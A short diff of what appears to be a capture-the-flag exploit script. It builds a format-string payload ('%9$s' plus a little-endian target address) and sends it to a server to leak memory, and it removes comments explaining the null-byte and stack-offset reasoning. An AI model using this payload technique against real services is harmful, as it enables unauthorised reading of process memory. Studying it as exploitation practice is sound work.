@@ -16,13 +16,8 @@ def main():
 
     target_addr = 0x4040b0
 
-    #payload = (target_addr).to_bytes(8, "little") + b'_%8$s'
-    #In memory (little-endian), this looks like: \xb0\x40\x40\x00\x00\x00\x00\x00
-    #If you put this address at the beginning of your payload, your payload starts with \xb0\x40\x40\x00. 
-    # When printf tries to read your payload as a format string, it sees \xb0\x40\x40 and then hits the Null Byte (\x00). 
-    # It thinks the string has ended, so it stops processing immediately. It never reaches your %y$s.
+    #payload = (target_addr).to_bytes(8, "little") + b'_%8$s' -> printf
 
-    #if the offset of my first input name is at 8, since %y$s____ takes 8 bytes, the new offset will be at 9 (+1, next arg in the stack, next 8 bytes) 
     payload = b'%9$s____' + (target_addr).to_bytes(8, "little")
     server.sendline(payload)
 
